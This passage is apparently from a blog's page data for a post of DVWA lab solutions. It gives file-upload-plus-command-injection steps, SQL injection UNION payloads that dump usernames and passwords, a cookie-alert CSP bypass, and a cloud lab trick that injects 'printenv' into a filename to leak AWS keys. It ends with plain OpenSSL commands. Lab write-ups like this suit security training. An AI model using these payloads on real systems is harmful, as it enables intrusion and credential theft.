important\">?></span></span></code></pre></div>\n<ul>\n<li>Access the file.</li>\n</ul>\n<h2>Medium</h2>\n<ul>\n<li>Create the php file</li>\n<li>Save it as .png file</li>\n<li>upload it</li>\n<li>go to command injection</li>\n<li><code class=\"language-text\">127.0.0.1 &amp; copy ..\\..\\hackable\\uploads\\uploadmed.png ..\\..\\hackable\\uploads\\uploadmed.php</code></li>\n<li>now go back to uploads and access the file.</li>\n</ul>\n<h2>High</h2>\n<ul>\n<li>The php file looks like</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">GIF98\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">getenv</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'PATH'</span><span class=\"token punctuation\">)</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<ul>\n<li>Save it as .jpeg file</li>\n<li>Upload it</li>\n<li>go to command injection</li>\n<li><code class=\"language-text\">127.0.0.1|copy ..\\..\\hackable\\uploads\\uploadhigh.jpeg ..\\..\\hackable\\uploads\\uploadhigh.php</code></li>\n<li>now go back to uploads and access the file.</li>\n</ul>\n<h1>SQL Injection</h1>\n<h2>Low</h2>\n<p><strong>Attack :</strong> %’ or 1=1 union select null,concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#\n(or)\n%’ or 1=1 union select null,version()#</p>\n<h2>Medium</h2>\n<p><strong>Attack :</strong> 1 or 1=1 union select null,concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users\n(or)\n1 or 1=1 union select null,version()</p>\n<h2>High</h2>\n<ul>\n<li>Click on <code class=\"language-text\">Click here to change ID</code></li>\n</ul>\n<p><strong>Attack :</strong> %’ or 1=1 union select null,concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#\n(or)\n%’ or 1=1 union select null,version()#</p>\n<h1>CSP Bypass</h1>\n<h2>Low</h2>\n<ul>\n<li>go to hastebin</li>\n<li>make a file with contents</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"js\"><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">.</span>cookie<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>Save and go to <code class=\"language-text\">just text</code></li>\n<li>Paste the link in the input field and click go.</li>\n</ul>\n<h1>AWS Cloud Attack Defense Command Injection</h1>\n<ul>\n<li>Upload the file</li>\n<li>Switch on proxy</li>\n<li>Catch in burpsuite</li>\n<li>Right click and send to repeater</li>\n<li>add printenv to the end of the Filename</li>\n<li>Collect the following from response\n<ul>\n<li>SESSION TOKEN</li>\n<li>SECRET_ACCESS_KEY</li>\n<li>ACCESS_KEY_ID</li>\n</ul>\n</li>\n<li>Export them in the terminal in the same order</li>\n<li>Run the following commands</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">aws s3 <span class=\"token function\">ls</span> s3://temporary-public-image-store\naws s3 <span class=\"token function\">cp</span> s3://temporary-public-image-store/flag.txt <span class=\"token builtin class-name\">.</span>\n<span class=\"token function\">cat</span> flag.txt</code></pre></div>\n<h1>Open SSL</h1>\n<ul>\n<li>Install from <a href=\"https://slproweb.com/products/Win32OpenSSL.html\">https://slproweb.com/products/Win32OpenSSL.html</a> 5MB File</li>\n</ul>\n<p>ENCRYPTION:\n<code class=\"language-text\">openssl enc -salt -aes-256-cbc -in file.txt -out enc.txt</code></p>\n<p><code class=\"language-text\">openssl enc -d -aes-256-cbc -in enc.txt -out dec.txt</code></p>\n<p>HASH:\n<code class=\"language-text\">openssl dgst -sha256 file.txt</code></p>\n<p><code class=\"language-text\">openssl dgst -sha256 file.txt > hash.txt</code></p>","frontmatter":{"title":"Solutions for DVWA","tags":["ctf","guidance"],"date":"March 04, 2023","description":null}},"prev":{"frontmatter":{"title":"Cyber Security Resources"},"fields":{"slug":"/blog/cybersec-resources/"}},"next":{"frontmatter":{"title":"Clojure Fundamentals"},"fields":{"slug":"/blog/clojure-notes/"}}},"pageContext":{"slug":"/blog/dvwa-solutions/","prevSlug":"/blog/cybersec-resources/","nextSlug":"/blog/clojure-notes/"}},"staticQueryHashes":["2555585279","3159585216","642215718"]}